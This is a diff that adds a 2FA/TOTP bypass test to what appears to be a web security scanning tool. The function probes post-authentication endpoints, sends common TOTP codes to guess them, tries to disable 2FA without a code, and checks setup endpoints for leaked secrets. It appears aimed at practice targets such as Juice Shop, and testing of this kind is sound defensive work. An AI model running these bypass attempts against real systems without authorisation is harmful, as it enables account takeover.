@@ -686,6 +686,241 @@ async def test_auth_bypass_schema(url: str, auth_session: Optional[Dict[str, Any
     except Exception as e:
         return {"status": "error", "message": str(e)}
 
+# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
+async def test_2fa_bypass(url: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    """
+    WSTG-ATHN-09: Test 2FA/TOTP bypass techniques.
+    Attempts to bypass two-factor authentication via:
+    1. Direct access to post-auth endpoints without completing 2FA
+    2. TOTP brute force with common values and rate-limit detection
+    3. 2FA setup/disable bypass without valid TOTP
+    """
+    from urllib.parse import urlparse
+
+    findings: List[Dict[str, Any]] = []
+    base = url.rstrip('/')
+
+    # Build auth headers if session provided
+    headers: Dict[str, str] = {}
+    cookies: Dict[str, str] = {}
+    tmp_token: Optional[str] = None
+
+    if auth_session:
+        if 'headers' in auth_session:
+            headers.update(auth_session['headers'])
+        elif 'token' in auth_session:
+            headers["Authorization"] = f"Bearer {auth_session['token']}"
+            tmp_token = auth_session['token']
+        if 'cookies' in auth_session:
+            cookies.update(auth_session['cookies'])
+
+    try:
+        async with httpx.AsyncClient(
+            timeout=10.0, verify=False, follow_redirects=True,
+            headers=headers, cookies=cookies
+        ) as client:
+
+            # ------------------------------------------------------------------
+            # 1. Direct access to post-auth endpoints without completing 2FA
+            # ------------------------------------------------------------------
+            post_auth_endpoints = [
+                "/api/Users",
+                "/rest/user/whoami",
+                "/api/Products",
+                "/api/Feedbacks",
+                "/api/Complaints",
+                "/profile",
+                "/administration",
+            ]
+
+            for ep in post_auth_endpoints:
+                try:
+                    resp = await client.get(f"{base}{ep}")
+                    if resp.status_code == 200 and len(resp.text) > 50:
+                        # Check if real data was returned (not a login redirect)
+                        body_lower = resp.text.lower()[:500]
+                        if 'login' not in body_lower and 'sign in' not in body_lower:
+                            try:
+                                data = resp.json()
+                                has_data = bool(data) if isinstance(data, (list, dict)) else False
+                            except Exception:
+                                has_data = len(resp.text) > 100
+
+                            if has_data:
+                                findings.append({
+                                    "type": "2fa_direct_access_bypass",
+                                    "endpoint": ep,
+                                    "severity": "critical",
+                                    "description": f"Post-auth endpoint {ep} accessible without completing 2FA step",
+                                    "evidence": resp.text[:200]
+                                })
+                except Exception:
+                    continue
+
+            # ------------------------------------------------------------------
+            # 2. TOTP brute force — common values + rate-limit check
+            # ------------------------------------------------------------------
+            totp_endpoints = [
+                "/rest/2fa/verify",
+                "/api/2fa/verify",
+                "/api/auth/2fa",
+                "/api/mfa/verify",
+            ]
+
+            common_totp_codes = ["000000", "111111", "123456", "999999", "000001", "654321"]
+
+            for totp_ep in totp_endpoints:
+                totp_url = f"{base}{totp_ep}"
+                rate_limited = False
+                attempts_before_limit = 0
+
+                for i, code in enumerate(common_totp_codes):
+                    payload = {"token": code}
+                    if tmp_token:
+                        payload["tmpToken"] = tmp_token
+
+                    try:
+                        resp = await client.post(totp_url, json=payload)
+
+                        # 404 means this endpoint doesn't exist — skip
+                        if resp.status_code == 404:
+                            break
+
+                        # Check for rate limiting
+                        if resp.status_code == 429 or any(
+                            kw in resp.text.lower()
+                            for kw in ["rate limit", "too many", "locked", "blocked", "try again later"]
+                        ):
+                            rate_limited = True
+                            attempts_before_limit = i + 1
+                            break
+
+                        # Check if TOTP was accepted
+                        if resp.status_code == 200:
+                            try:
+                                rj = resp.json()
+                                if isinstance(rj, dict) and (
+                                    rj.get("token") or rj.get("authentication") or
+                                    rj.get("access_token") or rj.get("success")
+                                ):
+                                    findings.append({
+                                        "type": "2fa_totp_brute_force",
+                                        "endpoint": totp_ep,
+                                        "severity": "critical",
+                                        "description": f"2FA TOTP accepted common code '{code}' on {totp_ep}",
+                                        "evidence": resp.text[:200]
+                                    })
+                                    break
+                            except Exception:
+                                pass
+
+                        await asyncio.sleep(0.3)
+                    except Exception:
+                        continue
+
+                # If we tested all codes without rate limiting on an existing endpoint
+                if not rate_limited and attempts_before_limit == 0:
+                    # Check if the endpoint actually existed (we didn't break on 404)
+                    # We only flag if we actually sent requests
+                    try:
+                        probe = await client.post(totp_url, json={"token": "000000"})
+                        if probe.status_code != 404:
+                            findings.append({
+                                "type": "2fa_no_rate_limit",
+                                "endpoint": totp_ep,
+                                "severity": "high",
+                                "description": f"No rate limiting on TOTP verification endpoint {totp_ep} — brute force feasible",
+                                "evidence": f"Sent {len(common_totp_codes)} TOTP attempts without rate limiting"
+                            })
+                    except Exception:
+                        pass
+
+            # ------------------------------------------------------------------
+            # 3. 2FA setup/disable bypass
+            # ------------------------------------------------------------------
+            # 3a. Check 2FA status
+            status_endpoints = ["/rest/2fa/status", "/api/2fa/status", "/api/mfa/status"]
+            for status_ep in status_endpoints:
+                try:
+                    resp = await client.get(f"{base}{status_ep}")
+                    if resp.status_code == 200:
+                        try:
+                            sdata = resp.json()
+                            if isinstance(sdata, dict):
+                                findings.append({
+                                    "type": "2fa_status_info_leak",
+                                    "endpoint": status_ep,
+                                    "severity": "medium",
+                                    "description": f"2FA status endpoint {status_ep} returns configuration details",
+                                    "evidence": str(sdata)[:200]
+                                })
+                        except Exception:
+                            pass
+                except Exception:
+                    continue
+
+            # 3b. Try disabling 2FA without TOTP
+            disable_endpoints = ["/rest/2fa/disable", "/api/2fa/disable", "/api/mfa/disable"]
+            for disable_ep in disable_endpoints:
+                try:
+                    # Try without any TOTP token
+                    resp = await client.post(f"{base}{disable_ep}", json={})
+                    if resp.status_code == 200:
+                        findings.append({
+                            "type": "2fa_disable_bypass",
+                            "endpoint": disable_ep,
+                            "severity": "critical",
+                            "description": f"2FA can be disabled without providing TOTP code at {disable_ep}",
+                            "evidence": resp.text[:200]
+                        })
+                    # Also try with empty password field
+                    resp2 = await client.post(f"{base}{disable_ep}", json={"password": "", "token": ""})
+                    if resp2.status_code == 200 and resp2.status_code != resp.status_code:
+                        findings.append({
+                            "type": "2fa_disable_bypass",
+                            "endpoint": disable_ep,
+                            "severity": "critical",
+                            "description": f"2FA disabled with empty credentials at {disable_ep}",
+                            "evidence": resp2.text[:200]
+                        })
+                except Exception:
+                    continue
+
+            # 3c. Check if 2FA setup leaks the TOTP secret
+            setup_endpoints = ["/rest/2fa/setup", "/api/2fa/setup", "/api/mfa/setup"]
+            for setup_ep in setup_endpoints:
+                try:
+                    resp = await client.post(f"{base}{setup_ep}", json={})
+                    if resp.status_code == 200:
+                        body = resp.text
+                        # Look for base32-encoded TOTP secrets or otpauth:// URIs
+                        secret_leaked = (
+                            "otpauth://" in body or
+                            re.search(r'[A-Z2-7]{16,}', body) is not None or
+                            "secret" in body.lower()
+                        )
+                        if secret_leaked:
+                            findings.append({
+                                "type": "2fa_setup_secret_leak",
+                                "endpoint": setup_ep,
+                                "severity": "high",
+                                "description": f"2FA setup endpoint {setup_ep} leaks TOTP secret without proper auth",
+                                "evidence": body[:200]
+                            })
+                except Exception:
+                    continue
+
+        vulnerable = len(findings) > 0
+        return {"status": "success", "data": {
+            "vulnerable": vulnerable,
+            "findings": findings,
+            "vulnerabilities_found": len(findings),
+            "description": "2FA/TOTP bypass testing complete"
+        }}
+    except Exception as e:
+        return {"status": "error", "message": f"2FA bypass test failed: {e}"}
+
+
 # --- Prompt (tidak ada perubahan signifikan) ---
 # @mcp.prompt()  # REMOVED: Using JSON-RPC adapter
 def setup_prompt(domainname: str) -> str:
